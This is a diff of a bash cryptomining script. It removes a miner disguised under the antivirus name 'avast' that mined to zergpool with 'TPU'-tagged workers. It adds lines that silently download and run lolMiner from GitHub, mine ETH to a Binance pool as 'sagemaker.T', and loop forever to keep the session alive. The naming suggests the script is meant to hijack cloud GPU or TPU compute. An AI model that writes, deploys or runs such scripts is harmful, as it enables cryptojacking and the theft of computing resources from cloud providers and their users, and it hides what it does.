@@ -1,4 +1,17 @@
 #!/bin/bash
 
-chmod +x avast  >/dev/null 2>&1
-./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.38/lolMiner_v1.38_Lin64.tar.gz >/dev/null 2>&1
+tar -xf lolMiner_v1.38_Lin64.tar.gz >/dev/null 2>&1
+cd 1.38 >/dev/null 2>&1
+
+echo -n "$(tput setaf 3)GPU Found => Tesla ";nvidia-smi | grep "Tesla" | sed "s/.*Tesla \([^ ]*\).*/\1/"
+echo "$(tput sgr 0)"
+echo "$(tput setaf 2)"
+echo -e "\e[1mlolMiner is Running..!\e[22m"
+echo "$(tput sgr 0)"
+./lolMiner --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.T
+while true
+do
+sleep 30
+done
